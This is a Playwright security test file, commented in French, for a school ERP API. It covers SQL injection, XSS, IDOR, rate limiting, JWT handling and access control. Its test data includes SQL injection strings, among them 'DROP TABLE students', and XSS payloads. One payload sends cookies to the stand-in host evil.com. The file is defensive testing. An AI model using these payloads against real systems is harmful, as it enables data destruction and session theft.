/**
 * TESTS DE SÉCURITÉ : SCHOLARIS ERP
 * 
 * Tests de vulnérabilités :
 * 1. Injection SQL via champs de recherche
 * 2. XSS via champs de saisie (noms, commentaires)
 * 3. IDOR : un parent ne peut pas accéder aux notes d'un autre enfant
 * 4. Rate limiting : 429 après 100 requêtes/minute
 * 5. JWT expiré → 401, refresh → nouveau token
 */

import { test, expect } from "@playwright/test";

const API_BASE_URL = process.env.NEST_API_URL || "http://localhost:3001/api";

let authToken: string;
let parentToken: string;
let otherParentToken: string;
let studentId: string;
let otherStudentId: string;

test.describe("Tests de sécurité", () => {
  test.beforeAll(async ({ request }) => {
    // Setup : créer 2 parents avec leurs enfants
    const setupResponse = await request.post(`${API_BASE_URL}/test/setup-security-test`, {
      data: {
        scenario: "IDOR_TEST",
      },
    });

    if (setupResponse.ok()) {
      const setup = await setupResponse.json();
      parentToken = setup.parent1Token;
      otherParentToken = setup.parent2Token;
      studentId = setup.student1Id;
      otherStudentId = setup.student2Id;
    }
  });

  test.describe("1. Protection contre l'injection SQL", () => {
    test("Recherche d'élève avec tentative d'injection SQL - OR 1=1", async ({ request }) => {
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      expect(loginResponse.ok()).toBeTruthy();
      authToken = (await loginResponse.json()).accessToken;

      // Tentative d'injection SQL classique
      const maliciousSearches = [
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT NULL, NULL, NULL--",
        "'; DROP TABLE students;--",
        "1' AND 1=1--",
      ];

      for (const payload of maliciousSearches) {
        const searchResponse = await request.get(`${API_BASE_URL}/students?search=${encodeURIComponent(payload)}`, {
          headers: { Authorization: `Bearer ${authToken}` },
        });

        // Doit retourner 200 avec résultats vides ou filtrés, PAS d'erreur SQL
        expect(searchResponse.ok()).toBeTruthy();

        const result = await searchResponse.json();

        // Vérifier qu'aucune donnée sensible n'est exposée
        expect(result.data).toBeInstanceOf(Array);

        // Pas d'erreur SQL dans la réponse
        const responseText = JSON.stringify(result);
        expect(responseText).not.toContain("SQL");
        expect(responseText).not.toContain("syntax error");
        expect(responseText).not.toContain("PrismaClientKnownRequestError");
      }
    });

    test("Login avec injection SQL dans le champ email", async ({ request }) => {
      const maliciousEmails = [
        "admin@scholaris.dev' OR '1'='1",
        "' OR 1=1--",
        "admin@scholaris.dev'--",
      ];

      for (const email of maliciousEmails) {
        const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
          data: {
            email,
            password: "anything",
          },
        });

        // Doit échouer avec 401 Unauthorized, PAS contourner l'authentification
        expect(loginResponse.status()).toBe(401);

        const error = await loginResponse.json();
        expect(error.message).toContain("invalide");
      }
    });
  });

  test.describe("2. Protection contre XSS (Cross-Site Scripting)", () => {
    test("Création d'élève avec script malveillant dans le nom", async ({ request }) => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//",
      ];

      for (const payload of xssPayloads) {
        const studentResponse = await request.post(`${API_BASE_URL}/students`, {
          headers: { Authorization: `Bearer ${authToken}` },
          data: {
            firstName: payload,
            lastName: "Test",
            dateOfBirth: "2010-01-01",
            gender: "M",
            matricule: `XSS${Date.now()}`,
          },
        });

        // Doit accepter ou sanitiser, mais PAS exécuter le script
        if (studentResponse.ok()) {
          const student = await studentResponse.json();

          // Vérifier que le payload est échappé/sanitisé
          expect(student.firstName).not.toBe(payload);
          expect(student.firstName).not.toContain("<script>");
          expect(student.firstName).not.toContain("onerror=");
          expect(student.firstName).not.toContain("javascript:");
        } else {
          // Ou rejeté avec validation error
          expect(studentResponse.status()).toBe(400);
        }
      }
    });

    test("Commentaire de note avec XSS dans le contenu", async ({ request }) => {
      const commentResponse = await request.post(`${API_BASE_URL}/grades`, {
        headers: { Authorization: `Bearer ${authToken}` },
        data: {
          studentId,
          subjectId: "{{subjectId}}",
          periodId: "{{periodId}}",
          score: 15,
          outOf: 20,
          type: "EXAM",
          comment: "<script>window.location='http://evil.com?cookie='+document.cookie</script>",
        },
      });

      if (commentResponse.ok()) {
        const grade = await commentResponse.json();

        // Commentaire doit être sanitisé
        expect(grade.comment).not.toContain("<script>");
        expect(grade.comment).not.toContain("window.location");
      }
    });
  });

  test.describe("3. Protection IDOR (Insecure Direct Object References)", () => {
    test("Parent ne peut PAS accéder aux notes d'un autre enfant", async ({ request }) => {
      // Parent 1 tente d'accéder aux notes de l'enfant du Parent 2
      const unauthorizedAccessResponse = await request.get(
        `${API_BASE_URL}/grades/student/${otherStudentId}`,
        {
          headers: { Authorization: `Bearer ${parentToken}` },
        },
      );

      // Doit échouer avec 403 Forbidden
      expect(unauthorizedAccessResponse.status()).toBe(403);

      const error = await unauthorizedAccessResponse.json();
      expect(error.message).toContain("autorisé");
    });

    test("Enseignant ne peut PAS modifier les notes d'une classe non assignée", async ({ request }) => {
      // Login enseignant
      const teacherLogin = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "teacher1@scholaris.dev",
          password: "TeacherPass123!",
        },
      });

      expect(teacherLogin.ok()).toBeTruthy();
      const teacherToken = (await teacherLogin.json()).accessToken;

      // Tenter de modifier une note d'une classe non assignée
      const unauthorizedGradeResponse = await request.post(`${API_BASE_URL}/grades`, {
        headers: { Authorization: `Bearer ${teacherToken}` },
        data: {
          studentId: otherStudentId,
          subjectId: "unassigned-subject-id",
          periodId: "{{periodId}}",
          score: 20,
          outOf: 20,
          type: "EXAM",
        },
      });

      // Doit échouer avec 403 Forbidden
      expect(unauthorizedGradeResponse.status()).toBe(403);
    });

    test("Élève ne peut PAS consulter les données financières d'un autre", async ({ request }) => {
      // Login student
      const studentLogin = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "student1@scholaris.dev",
          password: "StudentPass123!",
        },
      });

      if (studentLogin.ok()) {
        const studentToken = (await studentLogin.json()).accessToken;

        // Tenter d'accéder au résumé financier d'un autre élève
        const financialAccessResponse = await request.get(
          `${API_BASE_URL}/students/${otherStudentId}/financial-summary`,
          {
            headers: { Authorization: `Bearer ${studentToken}` },
          },
        );

        // Doit échouer avec 403
        expect(financialAccessResponse.status()).toBe(403);
      }
    });
  });

  test.describe("4. Rate Limiting", () => {
    test("Doit retourner 429 après 100 requêtes/minute", async ({ request }) => {
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      expect(loginResponse.ok()).toBeTruthy();
      const token = (await loginResponse.json()).accessToken;

      let rateLimitReached = false;

      // Faire 150 requêtes rapidement
      for (let i = 0; i < 150; i++) {
        const response = await request.get(`${API_BASE_URL}/students?limit=1`, {
          headers: { Authorization: `Bearer ${token}` },
        });

        if (response.status() === 429) {
          rateLimitReached = true;

          // Vérifier les headers de rate limiting
          const retryAfter = response.headers()["retry-after"];
          expect(retryAfter).toBeDefined();

          const rateLimitRemaining = response.headers()["x-ratelimit-remaining"];
          expect(rateLimitRemaining).toBe("0");

          break;
        }
      }

      expect(rateLimitReached).toBeTruthy();
    });

    test("Rate limiting doit être par utilisateur, pas global", async ({ request }) => {
      // User 1 fait 100 requêtes
      const user1Login = await request.post(`${API_BASE_URL}/auth/login`, {
        data: { email: "teacher1@scholaris.dev", password: "TeacherPass123!" },
      });

      const user1Token = (await user1Login.json()).accessToken;

      for (let i = 0; i < 100; i++) {
        await request.get(`${API_BASE_URL}/students?limit=1`, {
          headers: { Authorization: `Bearer ${user1Token}` },
        });
      }

      // User 2 doit pouvoir faire des requêtes
      const user2Login = await request.post(`${API_BASE_URL}/auth/login`, {
        data: { email: "teacher2@scholaris.dev", password: "TeacherPass123!" },
      });

      expect(user2Login.ok()).toBeTruthy();
      const user2Token = (await user2Login.json()).accessToken;

      const user2Request = await request.get(`${API_BASE_URL}/students?limit=1`, {
        headers: { Authorization: `Bearer ${user2Token}` },
      });

      // User 2 ne doit PAS être bloqué
      expect(user2Request.status()).toBe(200);
    });
  });

  test.describe("5. Gestion JWT (expiration, refresh)", () => {
    test("JWT expiré doit retourner 401", async ({ request }) => {
      // Token JWT expiré (simulation avec un vieux token)
      const expiredToken =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj0vVnZhf5aGEXLMCrfF3LcN5kXmG9vN0Sd1Qh9Y";

      const response = await request.get(`${API_BASE_URL}/students`, {
        headers: { Authorization: `Bearer ${expiredToken}` },
      });

      // Doit échouer avec 401 Unauthorized
      expect(response.status()).toBe(401);

      const error = await response.json();
      expect(error.message).toMatch(/expiré|expired|invalid/i);
    });

    test("Refresh token doit générer un nouveau access token", async ({ request }) => {
      // Login pour obtenir access + refresh tokens
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      expect(loginResponse.ok()).toBeTruthy();
      const loginData = await loginResponse.json();

      const oldAccessToken = loginData.accessToken;
      const refreshToken = loginData.refreshToken;

      expect(oldAccessToken).toBeDefined();
      expect(refreshToken).toBeDefined();

      // Attendre 2 secondes
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // Utiliser refresh token pour obtenir nouveau access token
      const refreshResponse = await request.post(`${API_BASE_URL}/auth/refresh`, {
        data: {
          refreshToken,
        },
      });

      expect(refreshResponse.ok()).toBeTruthy();
      const refreshData = await refreshResponse.json();

      const newAccessToken = refreshData.accessToken;
      expect(newAccessToken).toBeDefined();
      expect(newAccessToken).not.toBe(oldAccessToken);

      // Vérifier que le nouveau token fonctionne
      const testResponse = await request.get(`${API_BASE_URL}/auth/me`, {
        headers: { Authorization: `Bearer ${newAccessToken}` },
      });

      expect(testResponse.ok()).toBeTruthy();
    });

    test("Refresh token invalide doit retourner 401", async ({ request }) => {
      const invalidRefreshToken = "invalid.refresh.token";

      const refreshResponse = await request.post(`${API_BASE_URL}/auth/refresh`, {
        data: {
          refreshToken: invalidRefreshToken,
        },
      });

      expect(refreshResponse.status()).toBe(401);

      const error = await refreshResponse.json();
      expect(error.message).toContain("invalide");
    });

    test("Refresh token utilisé 2 fois doit être rejeté (rotation)", async ({ request }) => {
      // Login
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      const { refreshToken } = await loginResponse.json();

      // Utiliser refresh token une première fois
      const firstRefresh = await request.post(`${API_BASE_URL}/auth/refresh`, {
        data: { refreshToken },
      });

      expect(firstRefresh.ok()).toBeTruthy();

      // Tenter de réutiliser le même refresh token
      const secondRefresh = await request.post(`${API_BASE_URL}/auth/refresh`, {
        data: { refreshToken },
      });

      // Doit échouer (token rotation)
      expect(secondRefresh.status()).toBe(401);

      const error = await secondRefresh.json();
      expect(error.message).toMatch(/invalide|expiré|utilisé/i);
    });
  });

  test.describe("6. Permissions et RBAC", () => {
    test("Enseignant ne peut PAS accéder aux routes d'administration", async ({ request }) => {
      const teacherLogin = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "teacher1@scholaris.dev",
          password: "TeacherPass123!",
        },
      });

      const teacherToken = (await teacherLogin.json()).accessToken;

      const adminRoutes = [
        "/tenants",
        "/users",
        "/audit-logs",
        "/fee-structures",
      ];

      for (const route of adminRoutes) {
        const response = await request.get(`${API_BASE_URL}${route}`, {
          headers: { Authorization: `Bearer ${teacherToken}` },
        });

        // Doit échouer avec 403 Forbidden
        expect(response.status()).toBe(403);
      }
    });

    test("Parent ne peut accéder qu'aux données de ses propres enfants", async ({ request }) => {
      const parentLogin = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "parent1@scholaris.dev",
          password: "ParentPass123!",
        },
      });

      const parentToken = (await parentLogin.json()).accessToken;

      // Peut accéder aux notes de son enfant
      const ownChildGrades = await request.get(`${API_BASE_URL}/grades/student/${studentId}`, {
        headers: { Authorization: `Bearer ${parentToken}` },
      });

      expect(ownChildGrades.ok()).toBeTruthy();

      // NE PEUT PAS accéder aux notes d'un autre enfant
      const otherChildGrades = await request.get(`${API_BASE_URL}/grades/student/${otherStudentId}`, {
        headers: { Authorization: `Bearer ${parentToken}` },
      });

      expect(otherChildGrades.status()).toBe(403);
    });
  });

  test.describe("7. Protection des données sensibles", () => {
    test("Mot de passe ne doit jamais être renvoyé dans les réponses", async ({ request }) => {
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      const loginData = await loginResponse.json();

      // Vérifier que le password n'est pas dans la réponse
      const responseText = JSON.stringify(loginData);
      expect(responseText).not.toContain("ChangeMe123!");
      expect(loginData.user.password).toBeUndefined();

      // Vérifier aussi sur /auth/me
      const meResponse = await request.get(`${API_BASE_URL}/auth/me`, {
        headers: { Authorization: `Bearer ${loginData.accessToken}` },
      });

      const meData = await meResponse.json();
      expect(meData.password).toBeUndefined();
    });

    test("Informations bancaires doivent être masquées", async ({ request }) => {
      const loginResponse = await request.post(`${API_BASE_URL}/auth/login`, {
        data: {
          email: "admin@scholaris.dev",
          password: "ChangeMe123!",
        },
      });

      const token = (await loginResponse.json()).accessToken;

      const paymentsResponse = await request.get(`${API_BASE_URL}/payments?limit=10`, {
        headers: { Authorization: `Bearer ${token}` },
      });

      const payments = await paymentsResponse.json();

      for (const payment of payments.data || []) {
        // Numéros de carte / comptes bancaires doivent être masqués
        if (payment.bankAccountNumber) {
          expect(payment.bankAccountNumber).toMatch(/\*+/);
          expect(payment.bankAccountNumber.replace(/\*/g, "").length).toBeLessThan(6);
        }

        if (payment.cardNumber) {
          expect(payment.cardNumber).toMatch(/\*+/);
        }
      }
    });
  });
});
